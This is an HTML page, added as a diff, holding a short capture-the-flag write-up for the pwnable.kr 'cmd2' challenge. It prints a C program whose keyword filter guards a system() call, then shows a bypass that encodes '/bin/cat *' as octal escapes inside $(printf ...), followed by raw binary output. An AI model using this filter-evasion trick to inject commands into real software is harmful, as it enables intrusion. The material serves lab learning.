@@ -1,0 +1,75 @@
+<head>
+    <title>pwnable.kr - cmd2 writeup</title>
+</head>
+
+<body>
+    <p style="display: block; white-space: pre-wrap;">
+    So let's start by looking at the source code:
+
+    <code style="display: block; white-space: pre-wrap;">
+        #include &lt;stdio.h&gt;
+        #include &lt;string.h&gt;
+
+        int filter(char* cmd){
+        int r=0;
+        r += strstr(cmd, "=")!=0;
+        r += strstr(cmd, "PATH")!=0;
+        r += strstr(cmd, "export")!=0;
+        r += strstr(cmd, "/")!=0;
+        r += strstr(cmd, "`")!=0;
+        r += strstr(cmd, "flag")!=0;
+        return r;
+        }
+
+        extern char** environ;
+        void delete_env(){
+        char** p;
+        for(p=environ; *p; p++)	memset(*p, 0, strlen(*p));
+        }
+
+        int main(int argc, char* argv[], char** envp){
+        delete_env();
+        putenv("PATH=/no_command_execution_until_you_become_a_hacker");
+        if(filter(argv[1])) return 0;
+        printf("%s\n", argv[1]);
+        system( argv[1] );
+        return 0;
+        }
+    </code>
+
+    So this is very simillar to the last level except we add more words to the filter. we can bypass this by printing the ascii codes of /bin/cat *:
+
+    <code style="display: block; white-space: pre-wrap;">
+        Python 2.7.12 (default, Mar  1 2021, 11:38:31)
+[GCC 5.4.0 20160609] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+&gt;&gt;&gt; s = "/bin/cat *"
+&gt;&gt;&gt; [str(oct(ord(c))) for c in s]
+['057', '0142', '0151', '0156', '057', '0143', '0141', '0164', '040', '052']
+&gt;&gt;&gt;
+    </code>
+
+    lets run the program with this argument:
+
+    <code style="display: block; white-space: pre-wrap;">
+        cmd2@pwnable.kr:~$ ./cmd2 '$(printf "\57\142\151\156\57\143\141\164\40\52")'
+
+        }LF&gt;@@p@8	@@@@@ï¿½88@8@@@ï¿½
+ï¿½
+int main(int argc, char* argv[], char** envp){	@&lt;&lt;Qï¿½tRï¿½td((`(`ï¿½ï¿½/lib64/ld-linux-x86-64.so.2&gt;NUGNU@ï&gt;½&gt;B!udï¿½ ï¿½?	*ï¿½ï¿½ï¿½Nï¿½	0ï¿½@
+        delete_env();                                                                                                           Ä‰ï¿½ï¿½Ý£kÅ¹ï¿&amp;@ï¿½4;B&amp;U!HV!HTH__gmon_start__libc.so.6putsmemsetstrstrputenvsystemstrchr__libc_start_putenv("PATH=/no_command_execution_until_you_become_a_hacker");
+        if(filter(argv[1])) return 0;        ``` `(`0Hï¿½ï¿½ï¿½Jï¿½Hï¿½ï¿½ï¿½5j
+ ï¿½%l    printf("%s\n", argv[1]);
+ @ï¿½%j   system( argv[1] );
+ hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½return 0;
+}hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½%Z
+ hï¿½ï¿½ï¿½ï¿½ï¿½ï¿½%R
+********************************************
+
+    </code>
+
+    Great we solved it !
+
+    EOF
+    </p>
+</body>
